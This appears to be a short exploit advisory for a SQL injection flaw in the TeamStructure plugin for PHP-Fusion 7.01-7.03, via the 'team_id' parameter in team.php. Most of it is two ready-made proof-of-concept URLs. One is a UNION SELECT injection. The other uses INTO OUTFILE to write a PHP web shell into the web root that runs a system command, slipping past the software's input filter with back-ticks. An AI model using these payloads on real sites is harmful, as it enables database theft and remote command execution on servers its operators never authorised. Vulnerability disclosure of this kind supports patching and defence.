# Author: Saif El-Sherei
# Software Link:
http://www.php-fusion.co.uk/infusions/addondb/view.php?addon_id=120
# Version: PHP-fusion (7.01..03), TeamStructure Infusion(all versions)
# Tested on: Firefox 3.0.15, , IE 8
 
Info:
 
Plugin that allows the site to have a list of all teams / clubs (eg football
or hockey) with the playing staff, displaying the standings with the
position of command or a list of the best strikers of a championship.
 
Details:
 
the "team_id" variable is not probably sanitized before using in SQL query
in "team.php", the attack can be elevated as shown in second POC to bypass
PHP-Fusion&#039;s GET variable XSS filter. by using back-ticks instead of
brackets used in any php function  in that case shell_exec().
 
Condition:
 
magic_quotes_gpc = Off
 
POC:
 
 
http://127.0.0.1/php-fusion/files/infusions/teams_structure/team.php?team_id=-1&#039;
union select
&#039;1&#039;,&#039;2&#039;,&#039;3&#039;,&#039;4&#039;,&#039;5&#039;,&#039;6&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&#039;10&#039;,&#039;11&#039;,&#039;12&#039;,&#039;13&#039;,&#039;14&#039;,&#039;15&#039;,&#039;16&#039;,&#039;17
 
http://127.0.0.1/php-fusion/files/infusions/teams_structure/team.php?team_id=-1&#039;
union select &#039;1&#039;,&#039;2&#039;,&#039;<?php $out=`id`;echo $out;
?>&#039;,&#039;4&#039;,&#039;5&#039;,&#039;6&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&#039;10&#039;,&#039;11&#039;,&#039;12&#039;,&#039;13&#039;,&#039;14&#039;,&#039;15&#039;,&#039;16&#039;,&#039;17&#039; into
outfile &#039;/var/www/php-fusion/files/images/test.php
 
Regards,
 
Saif El-Sherei
 
OSCP



